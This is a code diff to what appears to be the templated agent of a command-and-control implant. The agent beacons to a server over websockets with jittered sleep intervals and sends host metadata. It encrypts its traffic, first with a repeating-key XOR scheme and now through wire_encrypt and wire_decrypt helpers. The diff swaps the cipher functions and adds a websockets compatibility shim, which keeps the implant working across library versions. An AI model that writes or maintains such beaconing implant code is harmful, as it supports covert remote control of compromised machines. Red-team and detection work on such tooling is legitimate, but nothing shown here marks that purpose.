@@ -24,19 +24,11 @@ BEACON_JITTER = {{BEACON_JITTER}}
 
 
 def simple_encrypt(data: str) -> str:
-    """XOR encryption"""
-    key = b'{{ENCRYPTION_KEY}}'
-    encoded = data.encode('latin-1')
-    encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
-    return base64.b64encode(encrypted).decode()
+    return wire_encrypt(data)
 
 
 def simple_decrypt(data: str) -> str:
-    """XOR decryption"""
-    key = b'{{ENCRYPTION_KEY}}'
-    decoded = base64.b64decode(data.encode())
-    decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
-    return decrypted.decode('latin-1')
+    return wire_decrypt(data)
 
 
 def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
@@ -209,7 +201,16 @@ async def connect_to_server():
 
     while True:
         try:
-            async with websockets.connect(uri, max_size=10485760, extra_headers=WS_HEADERS) as websocket:
+            _ws_kw = {}
+            try:
+                import inspect as _inspect
+                if 'additional_headers' in _inspect.signature(websockets.connect).parameters:
+                    _ws_kw['additional_headers'] = WS_HEADERS
+                else:
+                    _ws_kw['extra_headers'] = WS_HEADERS
+            except Exception:
+                _ws_kw['extra_headers'] = WS_HEADERS
+            async with websockets.connect(uri, max_size=10485760, **_ws_kw) as websocket:
                 metadata = get_metadata()
                 metadata['mode'] = 'beacon'
                 metadata['beacon_interval'] = beacon_interval
